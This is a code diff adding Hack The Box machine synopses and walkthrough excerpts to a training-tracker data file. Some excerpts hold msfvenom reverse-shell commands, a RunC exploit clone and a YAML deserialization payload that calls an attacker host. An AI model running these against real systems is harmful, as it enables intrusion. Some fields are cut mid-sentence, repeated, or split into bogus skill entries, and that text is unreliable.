-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Atom is a Medium Windows machine that features a hosting of Electron software. The website hosts a windows version of the application (Electron Builder) where a vulnerability in signature validation can lead to remote command execution and thus get a foothold on system as user jason. By capturing the password of Redis service from configuration file it was possible to get the encrypted password of user Administrator. By using exploitation for the PortableKanban the administrator's password can be decrypted and thus login through winrm to the system. Note: IP target address might differ.",
+    "officialPdf": "340-Atom_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAtom is a Medium Windows machine that features a hosting of Electron software. The website hosts a windows version of the application (Electron Builder) where a vulnerability in signature validation can lead to remote command execution and thus get a foothold on system as user jason. By capturing the password of Redis service from configuration file it was possible to get the encrypted password of user Administrator. By using exploitation for the PortableKanban the administrator's password can be decrypted and thus login through winrm to the system. Note: IP target address might differ.\n\n### ⚔️ Foothold Vector\non system as user jason. By capturing the password of Redis service from configuration file it was possible to get the encrypted password of user Administrator. By using exploitation for the PortableKanban the administrator's password can be decrypted and thus login through winrm to the system. Note: IP target address might differ. Skills required Web Enumeration Basic Yaml Knowledge Basic Python Skills learned CVE Exploitation Custom Python script Enumeration Nmap Nmap reveals that the target server has many ports open. We also observe that Redis service is running. Let's connect to it. Redis We can use redis-cli to connect to this service. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.\n\n### 👑 Privilege Escalation\n) is exposed via smb share Software_Updates this can be exploited. We switch back to our Linux VM and create an executable using msfvenom . We calculate the sha512 hashes and update latest.yml contents as below. version: 1.2.3 files: - url: v'ulnerable-app-setup-1.2.3.exe sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA== size: 44653912 path: v'ulnerable-app-1.2.3.exe sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA== releaseDate: '2019-11-20T11:17:02.627Z' msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe sha512sum shell."
   },
   {
     "id": "htb-toolbox",
@@ -7145,15 +8049,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Docker-Toolbox",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/toolbox",
     "writeupUrl": "https://0xdf.gitlab.io/tags#toolbox",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Toolbox is an easy difficulty Windows machine that features a Docker Toolbox installation. Docker Toolbox is used to host a Linux container, which serves a site that is found vulnerable to SQL injection.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-03-12T10:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Toolbox is an easy difficulty Windows machine that features a Docker Toolbox installation. Docker Toolbox is used to host a Linux container, which serves a site that is found vulnerable to SQL injection. This is leveraged to gain a foothold on the Docker container. Docker Toolbox default credentials and host file system access are leveraged to gain a privileged shell on the host.",
+    "skillsLearned": [
+      "Leveraging PostgreSQL SQL Injection for RCE",
+      "Docker Toolbox"
+    ],
+    "officialPdf": "339-Toolbox_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nToolbox is an easy difficulty Windows machine that features a Docker Toolbox installation. Docker Toolbox is used to host a Linux container, which serves a site that is found vulnerable to SQL injection. This is leveraged to gain a foothold on the Docker container. Docker Toolbox default credentials and host file system access are leveraged to gain a privileged shell on the host.\n\n### 🎯 Core Skills\n- **Leveraging PostgreSQL SQL Injection for RCE**\n- **Docker Toolbox**\n\n### ⚔️ Foothold Vector\non the Docker container. Docker Toolbox default credentials and host file system access are leveraged to gain a privileged shell on the host. Skills Required Basic Web Knowledge Skills Learned Leveraging PostgreSQL SQL Injection for RCE Docker Toolbox Exploitation Enumeration Nmap output shows that ports 21 (FTP), 22 (SSH), 135 (RPC), 139 (NetBIOS), 443 (Apache), 445 (SMB) and 5985 (Windows Remote Management) are available. This is a Windows machine, but the Apache server is is detected as running on a Debian server. This indicates that some kind of virtualization / containerization is at play here. Nmap output also reveals that the FTP server is configured for anonymous access.\n\n### 👑 Privilege Escalation\nDocker Toolbox uses VirtualBox to run a VM that houses all the containers. This is achieved using the Boot2Docker distribution on VirtualBox. Looking at the documentation, the default credentials are found to be docker / tcuser . The Docker host is always present at the gateway IP address. The IP address of the container is 172.17.0.2 , which means that the Docker host VM is at 172.17.0.1 . Let's try to SSH into it using the default credentials. Before using SSH, we'll have to spawn an interactive TTY shell using Python. We were able to logon to the Docker VM. According to the documentation, docker-toolbox has access to the C:\\Users folder by default, which is mounted at /c/Users ."
   },
   {
     "id": "htb-unobtainium",
@@ -7164,15 +8076,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Prototype-pollution"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/unobtainium",
     "writeupUrl": "https://0xdf.gitlab.io/tags#unobtainium",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Unobtainium is a hard difficulty Linux machine which features kubernetes exploitation and electron application reversing. Frontend web application serve unobtainium chat application created with electron which can be downloaded in three different packages (deb, rpm & snap).",
     "timeSpentSeconds": 0,
     "createdAt": "2021-04-10T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Unobtainium is a hard difficulty Linux machine which features kubernetes exploitation and electron application reversing. Frontend web application serve unobtainium chat application created with electron which can be downloaded in three different packages (deb, rpm & snap). Electron application exposes a Node JS API which is affected with prototype pollution. Exploiting prototype pollution and gain reverse shell give us access inside a kubernetes pod.",
+    "skillsLearned": [
+      "Electron application reversing",
+      "Prototype pollution"
+    ],
+    "officialPdf": "338-Unobtainium_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nUnobtainium is a hard difficulty Linux machine which features kubernetes exploitation and electron application reversing. Frontend web application serve unobtainium chat application created with electron which can be downloaded in three different packages (deb, rpm & snap). Electron application exposes a Node JS API which is affected with prototype pollution. Exploiting prototype pollution and gain reverse shell give us access inside a kubernetes pod.\n\n### 🎯 Core Skills\n- **Electron application reversing**\n- **Prototype pollution**\n\n### ⚔️ Foothold Vector\nand electron application reversing. Frontend web application serve unobtainium chat application created with electron which can be downloaded in three different packages (deb, rpm & snap). Electron application exposes a Node JS API which is affected with prototype pollution. Exploiting prototype pollution and gain reverse shell give us access inside a kubernetes pod. Understanding the Kubernetes RBAC system is critical in order to switch service accounts and create a malicious pod to mount\n\n### 👑 Privilege Escalation\nfilesystem and escape the pod. Skills Required Basic docker knowledge Node JS Network enumeration Skills Learned Electron application reversing Prototype pollution exploitation Kubernetes exploitation Enumeration Nmap reveals that SSH is running at port 22 and Apache2 is running at port 80, both as default. We have two new interesting ports though 8443 and 31337. Lets enumerate all these open ports. Port 80 We got presented with a download page on frontend where there is a kind of chat application developed by Unobtainium that can be downloaded for different platforms. Port 31337 ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-schooled",
@@ -7183,15 +8103,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2020-14321",
+      "CVE-2020-25627",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/schooled",
     "writeupUrl": "https://0xdf.gitlab.io/tags#schooled",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a teacher user, escalate privileges to a m",
     "timeSpentSeconds": 0,
     "createdAt": "2021-04-03T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Schooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a teacher user, escalate privileges to a manager user and install a malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle database allows SSH access to the system via password reuse.",
+    "skillsLearned": [
+      "Exploiting Moodle vulnerabilities",
+      "Installing custom FreeBSD packages"
+    ],
+    "officialPdf": "335-Schooled_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSchooled is a medium difficulty FreeBSD machine that showcases two recently disclosed vulnerabilities affecting the Moodle platform (labeled CVE-2020-25627 and CVE-2020-14321), which have to be chained together in order to gain access as a teacher user, escalate privileges to a manager user and install a malicious plugin resulting in remote command execution. Cracking a hash obtained from the Moodle database allows SSH access to the system via password reuse.\n\n### 🎯 Core Skills\n- **Exploiting Moodle vulnerabilities**\n- **Installing custom FreeBSD packages**\n\n### 🛡️ Associated CVEs\n`CVE-2020-14321`, `CVE-2020-25627`\n\n### ⚔️ Foothold Vector\nAfter enrolling in the Mathematics course, we can read the announcements posted by the teacher. The Reminder for joining students announcement informs us about the requirement to set a MoodleNet profile, and also tells us that the teacher will personally check all profiles before the course starts: In order to determine the current Moodle version, we can check the /moodle/lib/upgrade.txt file: Moodle 3.9 appears to be affected by a stored XSS vulnerability in the MoodleNet profile field (CVE-2020- 25627). Since we know the teacher is going to check our MoodleNet profile, we can attempt to exploit this vulnerability in order to steal his session cookie.\n\n### 👑 Privilege Escalation\nby installing a malicious package (which is possible due to sudo permissions and write access to the /etc/hosts file). Skills Required Web enumeration Hash cracking Basic FreeBSD knowledge Skills Learned Exploiting Moodle vulnerabilities Installing custom FreeBSD packages Enumeration Nmap Nmap reveals that OpenSSH and Apache are listening on their default ports, and another service (possibly mysqlx) is listening on port 33060. Apache ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.234 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.234 Browsing to port 80, the web page of the Schooled Educational Institution is shown."
   },
   {
     "id": "htb-armageddon",
@@ -7202,15 +8131,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Drupal",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/armageddon",
     "writeupUrl": "https://0xdf.gitlab.io/tags#armageddon",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Armageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-03-27T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Armageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host.",
+    "skillsLearned": [
+      "Drupal"
+    ],
+    "officialPdf": "323-Armageddon_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nArmageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host.\n\n### 🎯 Core Skills\n- **Drupal**\n\n### ⚔️ Foothold Vector\nSnap package manager exploitation Enumeration Nmap Nmap output reveals an Apache server and an SSH server running on their default ports. Let's visit the website on port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.99 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.99 Nmap reveals that the Apache server is hosting an instance of Drupal 7. This is the login page of the website, in which we don't have any credentials to login. Creating a new account is impossible since the mail verification seems to be broken. We need to search online for any Drupal 7 exploits.\n\n### 👑 Privilege Escalation\nis possible by uploading and installing to the host, a malicious application using Snapcraft. Skills required Basic Linux Knowledge Skills learned Drupal exploitation Snap package manager exploitation Enumeration Nmap Nmap output reveals an Apache server and an SSH server running on their default ports. Let's visit the website on port 80. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.99 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.99 Nmap reveals that the Apache server is hosting an instance of Drupal 7. This is the login page of the website, in which we don't have any credentials to login."
   },
   {
     "id": "htb-crossfittwo",
@@ -7221,15 +8157,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Host-header-injection",
+      "NodeJS-path-hijacking",
+      "Yubikey-simulation"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/crossfittwo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#crossfittwo",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "CrossFit2 is an insane difficulty BSD machine running a web server and an exposed unbound instance. An arbitrary file read is exploited to read relayd configuration.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-03-20T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "CrossFit2 is an insane difficulty BSD machine running a web server and an exposed unbound instance. An arbitrary file read is exploited to read relayd configuration. This gives access to vhosts with member applications. A password reset form vulnerable to host header injection can be exploited to register users and then exfiltrate chat via Cross Site Websocket Hijacking. Lateral movement involves exploiting nodejs path preference. Finally, a custom binary vulnerable to privileged file read is used to generate an OTP and get root. Note: Target IP address might differ.",
+    "skillsLearned": [
+      "Host header injection",
+      "Cross Site Websocket Hijacking",
+      "NodeJS path hijacking",
+      "Yubikey simulation"
+    ],
+    "officialPdf": "322-CrossFitTwo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCrossFit2 is an insane difficulty BSD machine running a web server and an exposed unbound instance. An arbitrary file read is exploited to read relayd configuration. This gives access to vhosts with member applications. A password reset form vulnerable to host header injection can be exploited to register users and then exfiltrate chat via Cross Site Websocket Hijacking. Lateral movement involves exploiting nodejs path preference. Finally, a custom binary vulnerable to privileged file read is used to generate an OTP and get root. Note: Target IP address might differ.\n\n### 🎯 Core Skills\n- **Host header injection**\n- **Cross Site Websocket Hijacking**\n- **NodeJS path hijacking**\n- **Yubikey simulation**\n\n### ⚔️ Foothold Vector\nReverse engineering Skills Learned Host header injection Cross Site Websocket Hijacking NodeJS path hijacking Yubikey simulation Enumeration Nmap Nmap reveals that OpenSSH and OpenBSD httpd services are listening on their default ports. Additionally, a service recognized as ub-dns-control is listening on port 8953. Unbound According to the unbound manual page, port 8953 is the default port used for remotely controlling the unbound daemon with the unbound-control utility.\n\n### 👑 Privilege Escalation\n. Note: Target IP address might differ. Skills Required Web enumeration Scripting CSRF exploitation Reverse engineering Skills Learned Host header injection Cross Site Websocket Hijacking NodeJS path hijacking Yubikey simulation Enumeration Nmap Nmap reveals that OpenSSH and OpenBSD httpd services are listening on their default ports. Additionally, a service recognized as ub-dns-control is listening on port 8953. Unbound According to the unbound manual page, port 8953 is the default port used for remotely controlling the unbound daemon with the unbound-control utility."
   },
   {
     "id": "htb-proper",
@@ -7245,10 +8193,17 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/proper",
     "writeupUrl": "https://0xdf.gitlab.io/tags#proper",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Proper is a hard difficulty Linux machine which features a web application loading products using an Ajax call leaking a secret key which helps in generating token that allows performing SQL Injection. The data obtained allows us to login to License portal having a feature to cha",
     "timeSpentSeconds": 0,
     "createdAt": "2021-03-13T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Proper is a hard difficulty Linux machine which features a web application loading products using an Ajax call leaking a secret key which helps in generating token that allows performing SQL Injection. The data obtained allows us to login to License portal having a feature to change the themes of the application. This feature leaks source code and found to be vulnerable to race condition using which foothold can be gained. A service having client server model allowing privileged writes which can be abused to gain system access.",
+    "skillsLearned": [
+      "Reversing Go applications",
+      "Exploiting Privileged Write Capabilities"
+    ],
+    "officialPdf": "321-Proper_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nProper is a hard difficulty Linux machine which features a web application loading products using an Ajax call leaking a secret key which helps in generating token that allows performing SQL Injection. The data obtained allows us to login to License portal having a feature to change the themes of the application. This feature leaks source code and found to be vulnerable to race condition using which foothold can be gained. A service having client server model allowing privileged writes which can be abused to gain system access.\n\n### 🎯 Core Skills\n- **Reversing Go applications**\n- **Exploiting Privileged Write Capabilities**\n\n### ⚔️ Foothold Vector\ncan be gained. A service having client server model allowing privileged writes which can be abused to gain system access. Skills Required Enumeration OWASP Top 10 Race Condition Exploitation Skills Learned Reversing Go applications Exploiting Privileged Write Capabilities Enumeration Nmap Nmap scan revealed that the target server has port 80 open which is running Microsoft IIS service. IIS Browsing to port 80 reveals an e-commerce application. There's nothing found to be interesting in this application. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.231 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -sC -sV -p$ports 10.10.10.\n\n### 👑 Privilege Escalation\nEnumerating the server, we find an unusual folder Cleanup in Program Files directory. It contain three files. README.md reveals the details about the Cleanup service. This service tries to locate the garbage files on the system and deletes them. We copy both the files to our machine using smbserver. We transfer the files to our Windows VM and run them. On the server window we look at the details of the files that are being cleaned. We open both the executables in tool Ghidra. main.main function in client.exe has the below checks. copy client.exe \\\\10.10.14.177\\test\\client.exe copy server.exe \\\\10.10.14.177\\test\\server.exe If supplied arguments are less than 2, it simply calls main."
   },
   {
     "id": "htb-thenotebook",
@@ -7259,15 +8214,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "2019",
+      "CVE-2019-5736",
+      "Exploiting-CVE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/thenotebook",
     "writeupUrl": "https://0xdf.gitlab.io/tags#thenotebook",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "TheNotebook is a medium difficulty Linux machine that showcases an insecure JWT implementation, which allows unprivileged users to obtain administrative access by forging and signing tokens with arbitrary attributes. This is possible because the private key used for signing token",
     "timeSpentSeconds": 0,
     "createdAt": "2021-03-06T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "TheNotebook is a medium difficulty Linux machine that showcases an insecure JWT implementation, which allows unprivileged users to obtain administrative access by forging and signing tokens with arbitrary attributes. This is possible because the private key used for signing tokens is fetched from an external source, which can be easily modified to point to an attacker-controlled location. Once access to the administration panel is obtained, it is possible to upload and execute PHP files resulting in remote command execution.",
+    "skillsLearned": [
+      "Abusing the Key ID parameter in JSON Web Tokens",
+      "Exploiting CVE",
+      "2019",
+      "573 to escalalate privileges via Docker"
+    ],
+    "officialPdf": "320-TheNotebook_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTheNotebook is a medium difficulty Linux machine that showcases an insecure JWT implementation, which allows unprivileged users to obtain administrative access by forging and signing tokens with arbitrary attributes. This is possible because the private key used for signing tokens is fetched from an external source, which can be easily modified to point to an attacker-controlled location. Once access to the administration panel is obtained, it is possible to upload and execute PHP files resulting in remote command execution.\n\n### 🎯 Core Skills\n- **Abusing the Key ID parameter in JSON Web Tokens**\n- **Exploiting CVE**\n- **2019**\n- **573 to escalalate privileges via Docker**\n\n### 🛡️ Associated CVEs\n`CVE-2019-5736`\n\n### ⚔️ Foothold Vector\nThe auth cookie contains a JWT token. We can either manually decode the base64-encoded header and payload fields or let JTW.IO do it for us. The header data shows that the RS256 algorithm is used for signing. Additionally, a kid (Key ID) is defined; this parameter, according to RFC 7515, is used as a hint indicating the private key that was used to sign the token. By making the Key ID point to a location under our control, it may be possible to forge valid tokens containing arbitrary data. Looking at the payload, the most interesting field seems to be admin_cap , which is currently set to false for our user. Setting it to true might grant us administrative privileges.\n\n### 👑 Privilege Escalation\nWe start by enumerating sudo privileges: The user is allowed to run /usr/bin/docker exec -it web app-dev01* as root . We check the Docker version: This version appears to be vulnerable to CVE-2019-5736. This would allow us to use one of the publicly available PoCs to overwrite RunC and gain root privileges on the host system. We clone the GitHub repository and switch to the project directory: We replace the binary provided with the PoC with a malicious executable generated with msfvenom : git clone https://github.com/twistlock/RunC-CVE-2019-5736 cd RunC-CVE-2019-5736 cd exec_POC/ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14."
   },
   {
     "id": "htb-spectra",
@@ -7278,15 +8245,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "File-System-Permissions",
+      "HTB",
+      "Lateral-Movement",
+      "Sudo"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/spectra",
     "writeupUrl": "https://0xdf.gitlab.io/tags#spectra",
-    "hint": "Hack The Box Other machine. Rated Easy difficulty.",
+    "hint": "Spectra is an easy difficulty Linux machine which features an Issue Software Tracker build on Wordpress. The server through directory listing discloses some credentials which can be used to gain access to administration dashboard.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-02-27T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Spectra is an easy difficulty Linux machine which features an Issue Software Tracker build on Wordpress. The server through directory listing discloses some credentials which can be used to gain access to administration dashboard. Initial foothold is possible by using a custom crafted malicious plugin. By further enumerating the system new credentials can be captured and thus lateral movement can be achieved to another user. Finally wrong permissions to configuration file permits a sudo action to manipulate the init processes in order to gain root.",
+    "skillsLearned": [
+      "Lateral Movement",
+      "File System Permissions",
+      "Sudo"
+    ],
+    "officialPdf": "317-Spectra_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSpectra is an easy difficulty Linux machine which features an Issue Software Tracker build on Wordpress. The server through directory listing discloses some credentials which can be used to gain access to administration dashboard. Initial foothold is possible by using a custom crafted malicious plugin. By further enumerating the system new credentials can be captured and thus lateral movement can be achieved to another user. Finally wrong permissions to configuration file permits a sudo action to manipulate the init processes in order to gain root.\n\n### 🎯 Core Skills\n- **Lateral Movement**\n- **File System Permissions**\n- **Sudo**\n\n### ⚔️ Foothold Vector\nis possible by using a custom crafted malicious plugin. By further enumerating the system new credentials can be captured and thus lateral movement can be achieved to another user. Finally wrong permissions to configuration file permits a sudo action to manipulate the init processes in order to gain\n\n### 👑 Privilege Escalation\n. Skills Required Web Enumeration Linux Enumeration Skills Learned Lateral Movement File System Permissions Sudo Exploitation Enumeration Nmap output shows that SSH, Nginx and MySQL are available on their default ports. There is no mention of this version of Nginx suffering from a RCE vulnerability. We can check out port 80 in a browser, and see the page below. Two links are provided, and it mentions creating a bookmark to access the builds on the FTP site. Let's make a note of this and examine the links. The Software Issue Tracker link takes us to /main/ , and a WordPress instance that the development team are looking to use until Jira is set up. ports=$(nmap -p- --min-rate=1000 -T4 10.10."
   },
   {
     "id": "htb-breadcrumbs",
@@ -7297,15 +8275,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Forging-PHP-sessions",
+      "HTB",
+      "SQL-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/breadcrumbs",
     "writeupUrl": "https://0xdf.gitlab.io/tags#breadcrumbs",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Breadcrumbs is a hard difficulty Windows machine running Apache web server with a library application. Directory",
     "timeSpentSeconds": 0,
     "createdAt": "2021-02-20T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Breadcrumbs is a hard difficulty Windows machine running Apache web server with a library application. Directory",
+    "skillsLearned": [
+      "Forging PHP sessions",
+      "SQL Injection"
+    ],
+    "officialPdf": "316-Breadcrumbs_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBreadcrumbs is a hard difficulty Windows machine running Apache web server with a library application. Directory\n\n### 🎯 Core Skills\n- **Forging PHP sessions**\n- **SQL Injection**\n\n### ⚔️ Foothold Vector\nis gained via unrestricted file upload. Plaintext credentials in a SQLite database assists in lateral movement. Finally, exploitation of SQL injection results in\n\n### 👑 Privilege Escalation\nto windows administrator user. Skills Required Enumeration Scripting Code Review Skills Learned Forging PHP sessions SQL Injection Enumeration Nmap We find a Windows server running SSH and Apache web server on both HTTP and HTTPS ports. Additionally, a MySQL server is also found running, which is a hint towards a SQL powered web application. Apache Browsing to port 80 reveals a page titled Library with a single button. ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.228 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -Pn -sC -sV 10.10.10.228 The same page is hosted on the HTTPS server as well. Clicking on the button takes us to a search form."
   },
   {
     "id": "htb-ophiuchi",
@@ -7316,15 +8303,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "YAML-Deserialization"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ophiuchi",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ophiuchi",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Ophiuchi is a Medium linux machine that features an Apache tomcat server hosting a Java Website. The website hosts an \"Online YAML Parser\" which is vulnerable to insecure java deserialization.",
     "timeSpentSeconds": 0,
     "createdAt": "2021-02-13T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ophiuchi is a Medium linux machine that features an Apache tomcat server hosting a Java Website. The website hosts an \"Online YAML Parser\" which is vulnerable to insecure java deserialization. We get remote code execution as tomcat. While enumerating we find clear text credentials for the admin user. We observe that admin user can run a program in GO language as root which loads a web assembly file which executes a script based on results. We can modify the results and get code execution as user root. Note: IP target address might differ.",
+    "skillsLearned": [
+      "YAML Deserialization",
+      "Web Assembly Decompilation",
+      "Go and Web Assembly Source Code Analysis"
+    ],
+    "officialPdf": "315-Ophiuchi_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOphiuchi is a Medium linux machine that features an Apache tomcat server hosting a Java Website. The website hosts an \"Online YAML Parser\" which is vulnerable to insecure java deserialization. We get remote code execution as tomcat. While enumerating we find clear text credentials for the admin user. We observe that admin user can run a program in GO language as root which loads a web assembly file which executes a script based on results. We can modify the results and get code execution as user root. Note: IP target address might differ.\n\n### 🎯 Core Skills\n- **YAML Deserialization**\n- **Web Assembly Decompilation**\n- **Go and Web Assembly Source Code Analysis**\n\n### ⚔️ Foothold Vector\nThe following payload can be used to verify if it's possible to invoke methods through deserialization. The payload above creates an object of type URL with the argument of our ip 10.10.14.2 , resulting in an HTTP request. We start a python HTTP server and submit the payload above. We do get a request back which proves that web application is vulnerable. A payload can be generated with this PoC. We clone the repository and edit the src/artsploit/AwesomeScriptEngineFactory.java file to replace the exec code with our reverse shell payload. !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://10.10.14.\n\n### 👑 Privilege Escalation\nwhich loads a web assembly file which executes a script based on results. We can modify the results and get code execution as user root. Note: IP target address might differ. Skills required Linux Enumeration Web Enumeration Skills learned YAML Deserialization Web Assembly Decompilation Go and Web Assembly Source Code Analysis Enumeration Nmap reveals two open ports running SSH (22) and Apache Tomcat (8080). Tomcat YAML (YAML Ain't Markup Language) is a popular configuration and serialization language. It's used by a wide variety of programs such as kubernetes, ansible etc. Let's try a simple line in YAML syntax such as the following: ports=$(nmap -p- --min-rate=1000 -T4 10.10.11."
   },
   {
     "id": "htb-scriptkiddie",
@@ -7335,15 +8331,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "2020",
+      "7384",
+      "CVE-2020-7384",
+      "Exploiting-CVE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/scriptkiddie",
     "writeupUrl": "https://0xdf.gitlab.io/tags#scriptkiddie",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability (CVE-2020-7384), along with classic attacks such as OS command injection and an insecure passwordless sudo configuration. Initial foothold on the machine is gained by uploading a malicious .",
     "timeSpentSeconds": 0,
     "createdAt": "2021-02-06T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
